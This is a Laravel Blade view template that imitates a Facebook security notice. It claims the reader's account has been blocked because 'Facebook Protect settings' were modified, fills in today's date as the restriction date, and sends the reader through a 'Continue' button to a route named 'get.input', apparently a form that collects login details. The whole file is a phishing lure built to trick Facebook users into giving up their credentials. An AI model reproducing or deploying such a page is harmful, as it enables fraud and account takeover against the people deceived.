@extends('layout')

@section('body')
<div id="app" data-v-app="">
    <div id="app">
      <div>
        <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
          <div class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"><img
              src="{{asset('images/f_locked.png')}}" class="w-[70%] mx-auto">
            <p class="font-bold text-2xl">The security of your account is at risk.</p>
            <p class="my-3"> We have temporarily blocked your account because your Facebook Protect settings have been
              modified. </p>
            <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
              <div class="text-2xl text-yellow-600"><ion-icon name="warning-outline" role="img" class="md hydrated">
                  <div style="width: 24px; height: auto;"><svg xmlns="http://www.w3.org/2000/svg"
                      class="ionicon s-ion-icon" viewBox="0 0 512 512">
                      <path
                        d="M85.57 446.25h340.86a32 32 0 0028.17-47.17L284.18 82.58c-12.09-22.44-44.27-22.44-56.36 0L57.4 399.08a32 32 0 0028.17 47.17z"
                        stroke-linecap="round" stroke-linejoin="round" class="ionicon-fill-none ionicon-stroke-width">
                      </path>
                      <path d="M250.26 195.39l5.74 122 5.73-121.95a5.74 5.74 0 00-5.79-6h0a5.74 5.74 0 00-5.68 5.95z"
                        stroke-linecap="round" stroke-linejoin="round" class="ionicon-fill-none ionicon-stroke-width">
                      </path>
                      <path d="M256 397.25a20 20 0 1120-20 20 20 0 01-20 20z"></path>
                    </svg></div>
                </ion-icon></div>
              <div>
                <p class="font-semibold text-lg">Your page was restricted on {{ now()->format('F dS Y')}}.</p>
                <p>We did this to protect your account from being suspended.</p>
              </div>
            </div>
            <p class="mt-3 mb-5"> We will guide you through some steps to lift the page restriction and unlock your
              account. </p><a href="{{route('get.input')}}"
              class="block text-lg cursor-pointer bg-blue-500 w-full font-semibold text-center py-3 text-white rounded-lg"
              style="text-decoration: none;">Continue</a>
          </div>
        </div>
      </div>
    </div>
  </div>

@endsection